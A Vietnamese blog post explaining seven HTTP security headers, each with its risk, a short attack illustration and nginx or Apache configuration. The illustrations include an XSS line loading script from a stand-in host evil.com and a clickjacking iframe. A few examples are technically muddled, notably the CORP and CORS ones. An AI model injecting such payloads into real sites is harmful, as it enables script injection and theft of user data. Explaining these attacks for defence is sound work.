---
layout: post
title: HTTP Security Headers
subtitle: Bảo Vệ Website Trước Các Cuộc Tấn Công Mạng
tags: [web, security, pentest]
comments: true
date: 2025-04-09 19:23:00 +0700
---

# HTTP Security Headers: Bảo Vệ Website Trước Các Cuộc Tấn Công Mạng

## 📑 Mục lục

- [HTTP Security Headers: Bảo Vệ Website Trước Các Cuộc Tấn Công Mạng](#http-security-headers-bảo-vệ-website-trước-các-cuộc-tấn-công-mạng)
  - [📑 Mục lục](#-mục-lục)
  - [Tại Sao HTTP Security Headers Quan Trọng?](#tại-sao-http-security-headers-quan-trọng)
  - [Danh Sách Các HTTP Security Headers Quan Trọng](#danh-sách-các-http-security-headers-quan-trọng)
    - [1. **X-Content-Type-Options**](#1-x-content-type-options)
    - [2. **X-Frame-Options**](#2-x-frame-options)
    - [3. **Content-Security-Policy (CSP)**](#3-content-security-policy-csp)
    - [4. **Strict-Transport-Security (HSTS)**](#4-strict-transport-security-hsts)
    - [5. **Referrer-Policy**](#5-referrer-policy)
    - [6. **Cross-Origin-Resource-Policy (CORP)**](#6-cross-origin-resource-policy-corp)
    - [7. **Access-Control-Allow-Origin**](#7-access-control-allow-origin)

HTTP Security Headers là các tiêu đề HTTP mà server gửi đến trình duyệt để hướng dẫn cách xử lý nội dung và tương tác với website. Chúng là lớp phòng thủ quan trọng giúp bảo vệ website khỏi các cuộc tấn công mạng phổ biến như Cross-Site Scripting (XSS), Clickjacking, Man-in-the-Middle (MitM), và nhiều mối đe dọa khác. Trong bài blog này, chúng ta sẽ đi sâu vào từng tiêu đề bảo mật, giải thích cách attackers có thể khai thác chúng nếu không được cấu hình đúng, và cách bạn nên cấu hình chúng để tăng cường bảo mật.

## Tại Sao HTTP Security Headers Quan Trọng?

Khi trình duyệt gửi yêu cầu đến server, server không chỉ trả về nội dung HTML mà còn gửi kèm các tiêu đề HTTP. Nếu không có các tiêu đề bảo mật hoặc cấu hình sai, attackers có thể:

- **Chèn mã độc**: Thực hiện các cuộc tấn công XSS để đánh cắp dữ liệu người dùng.
- **Giả mạo yêu cầu**: Sử dụng CSRF để thực hiện hành động trái phép thay mặt người dùng.
- **Đánh cắp thông tin**: Khai thác kết nối không mã hóa hoặc thông tin rò rỉ từ headers.
- **Lừa đảo người dùng**: Sử dụng Clickjacking để đánh lừa người dùng nhấp vào nội dung độc hại.

Cấu hình đúng các HTTP Security Headers không chỉ giảm thiểu rủi ro mà còn giúp website tuân thủ các tiêu chuẩn bảo mật hiện đại, tăng uy tín với người dùng và công cụ tìm kiếm.

## Danh Sách Các HTTP Security Headers Quan Trọng

### 1. **X-Content-Type-Options**

- **Mô tả**: Ngăn trình duyệt "đoán" kiểu nội dung (MIME type) của tệp nếu server không chỉ định rõ ràng.
- **Giá trị hợp lệ**: `nosniff`.
- **Rủi ro nếu không có**:
  - Attackers có thể tải lên tệp độc hại (ví dụ: một file `.jpg` chứa mã JavaScript) và lừa trình duyệt thực thi nó như script. Đây là kỹ thuật "MIME type sniffing attack".
- **Ví dụ khai thác**:
  - Một attacker tải lên file `malicious.jpg` chứa mã `<script>alert('Hacked');</script>`. Nếu server không định nghĩa MIME type và trình duyệt "sniff" thành `text/javascript`, mã độc sẽ chạy ngay lập tức.
- **Cách cấu hình**:
  ```nginx
  add_header X-Content-Type-Options "nosniff";
  ```
- **Lợi ích**: Đảm bảo trình duyệt chỉ xử lý nội dung theo MIME type do server chỉ định, ngăn chặn các cuộc tấn công dựa trên MIME type.
- **Tham Khảo**:
  - [https://hackerone.com/reports/369979](https://hackerone.com/reports/369979)
  - [https://hackerone.com/reports/9479](https://hackerone.com/reports/9479)

### 2. **X-Frame-Options**

- **Mô tả**: Ngăn website bị nhúng trong iframe, bảo vệ chống lại Clickjacking.
- **Giá trị hợp lệ**: DENY, SAMEORIGIN.
- **Rủi ro nếu không có**:
  - Attackers có thể nhúng website của bạn vào iframe trên trang độc hại, phủ giao diện giả mạo để lừa người dùng nhập thông tin nhạy cảm (như mật khẩu hoặc thông tin thẻ tín dụng).
- **Ví dụ khai thác**:
  - Một trang web giả mạo nhúng trang đăng nhập của bạn trong iframe: `<iframe src="https://yourwebsite.com/login"></iframe>`. Người dùng không nhận ra và nhập thông tin, attacker ghi lại dữ liệu qua các lớp giao diện giả.
- **Cách cấu hình**:

nginx:

```nginx
add_header X-Frame-Options "DENY";
```

apache:

```apache
Header set X-Frame-Options "DENY"
```

- **Lợi ích**: Ngăn website bị lạm dụng trong các cuộc tấn công Clickjacking.
- **Tham Khảo**:
  - [https://hackerone.com/reports/283951](https://hackerone.com/reports/283951)
  - [https://hackerone.com/reports/163646](https://hackerone.com/reports/163646)
  - [https://hackerone.com/reports/27594](https://hackerone.com/reports/27594)

### 3. **Content-Security-Policy (CSP)**

- **Mô tả**: Kiểm soát nguồn tài nguyên (script, hình ảnh, v.v.) mà trình duyệt được phép tải, giảm nguy cơ XSS và các mã độc khác.
- **Giá trị hợp lệ**: default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none';.
- **Rủi ro nếu không có**:
  - Attackers có thể chèn mã JavaScript từ nguồn bên ngoài hoặc nội tuyến (inline script) để thực thi mã độc, đánh cắp cookie, hoặc thao túng nội dung.
- **Ví dụ khai thác**:
  Nếu không có CSP, một lỗ hổng XSS cho phép chèn `<script src="https://evil.com/malware.js"></script>` sẽ chạy mã độc từ server của attacker.
- **Cách cấu hình**:

nginx:

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';";
```

apache:

```apache
Header set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';"
```

- **Lợi ích**: Giới hạn nguồn tài nguyên hợp lệ, giảm bề mặt tấn công từ XSS và các mã độc khác.

- **Tham Khảo**
  - [https://hackerone.com/reports/47472](https://hackerone.com/reports/47472)
  - [https://hackerone.com/reports/1588732](https://hackerone.com/reports/1588732)
  - [https://hackerone.com/reports/1481207](https://hackerone.com/reports/1481207)

### 4. **Strict-Transport-Security (HSTS)**

- **Mô tả**: Buộc trình duyệt chỉ sử dụng HTTPS, ngăn kết nối HTTP không mã hóa.
- **Giá trị hợp lệ**: max-age=31536000; includeSubDomains; preload.
- **Rủi ro nếu không có**:
  - Attackers có thể thực hiện tấn công MitM hoặc "SSL stripping" để chuyển hướng người dùng sang HTTP, đánh cắp dữ liệu nhạy cảm như cookie hoặc thông tin đăng nhập.
- **Ví dụ khai thác**:
  - Người dùng truy cập `http://yourwebsite.com` thay vì `https://`, attacker chặn kết nối, giả mạo nội dung và lấy cắp thông tin.
- **Cách cấu hình**:

nginx:

```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains";
```

apache:

```apache
Header set Strict-Transport-Security "max-age=31536000; includeSubDomains"
```

- **Lợi ích**: Đảm bảo mọi kết nối đều được mã hóa, giảm nguy cơ bị tấn công qua mạng.
- **Tham Khảo**:
  - [https://hackerone.com/reports/20072](https://hackerone.com/reports/20072)
  - [https://hackerone.com/reports/7969](https://hackerone.com/reports/7969)

### 5. **Referrer-Policy**

- **Mô tả**: Kiểm soát thông tin Referer được gửi khi người dùng nhấp vào liên kết.
- **Giá trị hợp lệ**: no-referrer, strict-origin-when-cross-origin.
- **Rủi ro nếu không có**:
  - Attackers có thể thu thập thông tin nhạy cảm từ header Referer (như token, tham số URL).
- **Ví dụ khai thác**:
  - URL `https://yourwebsite.com/reset?token=abc123` được gửi trong Referer khi người dùng nhấp sang trang độc hại, attacker thu thập token để chiếm quyền.
- **Cách cấu hình**:

```nginx
add_header Referrer-Policy "strict-origin-when-cross-origin";
```

- **Lợi ích**: Bảo vệ thông tin nhạy cảm khỏi bị rò rỉ qua header `Referer`.
- **Tham Khảo**:
  - [https://hackerone.com/reports/2133308](https://hackerone.com/reports/2133308)
  - [https://hackerone.com/reports/787160](https://hackerone.com/reports/787160)
  - [https://hackerone.com/reports/5199](https://hackerone.com/reports/5199)

### 6. **Cross-Origin-Resource-Policy (CORP)**

- **Mô tả**: Kiểm soát cách tài nguyên được chia sẻ với các origin khác.
- **Giá trị hợp lệ**: same-origin, same-site, cross-origin.
- **Rủi ro nếu không có**:
  - Attackers có thể tải tài nguyên từ website của bạn (như hình ảnh, script) và sử dụng chúng trong các trang độc hại.
- **Ví dụ khai thác**:
  - Một trang độc hại tải `<img src="https://evil.com/sensitive-image.jpg">` và sử dụng để phân tích hoặc đánh lừa người dùng.
- **Cách cấu hình**:

```nginx
add_header Cross-Origin-Resource-Policy "same-origin";
```

- **Lợi ích**: Giới hạn việc chia sẻ tài nguyên, giảm nguy cơ bị lạm dụng.
- **Tham Khảo**:
  - [https://hackerone.com/reports/958459](https://hackerone.com/reports/958459)
  - [https://hackerone.com/reports/426165](https://hackerone.com/reports/426165)
  - [https://hackerone.com/reports/13551](https://hackerone.com/reports/13551)
  - [https://hackerone.com/reports/2332728](https://hackerone.com/reports/2332728)

### 7. **Access-Control-Allow-Origin**

- **Mô tả**: Kiểm soát các origin được phép truy cập tài nguyên qua CORS.
- **Giá trị hợp lệ**: \*, https://trusted.com.
- **Rủi ro nếu cấu hình sai**:
  - Nếu đặt \*, attackers có thể truy cập tài nguyên từ bất kỳ origin nào, dẫn đến rò rỉ dữ liệu.
- **Ví dụ khai thác**:
  - API trả về dữ liệu nhạy cảm bị trang độc hại truy cập qua <script src="https://yourwebsite.com/api">.
- **Cách cấu hình**:

```nginx
add_header Access-Control-Allow-Origin "https://trusted.com";
```

- **Lợi ích**: Giới hạn truy cập tài nguyên chỉ từ các origin tin cậy.
